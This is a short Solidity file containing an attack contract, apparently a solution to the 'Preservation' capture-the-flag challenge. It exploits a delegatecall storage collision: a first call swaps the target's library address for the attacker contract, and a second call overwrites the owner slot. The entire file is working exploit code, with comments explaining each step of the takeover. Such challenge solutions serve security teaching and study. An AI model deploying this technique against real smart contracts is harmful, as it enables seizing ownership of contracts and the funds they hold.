// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation preservation;

    constructor(address _preservationAddress) {
        preservation = Preservation(_preservationAddress);
    }

    function attack() public {
        // call setFirstTime with the attacker address, this execution will change the address timeZone1Library to the attacker address
        preservation.setFirstTime(uint256(uint160(address(this))));
        // execute the setFirstTime function again, this time the transaction will execute setTime in our contract with players address
        preservation.setFirstTime(uint256(uint160(msg.sender)));
        require(preservation.owner() == msg.sender, "Attack failed");
    }

    function setTime(uint _owner) public {
        // change the owner of the Preservation contract to the attacker address
        owner = address(uint160(_owner));
    }
}
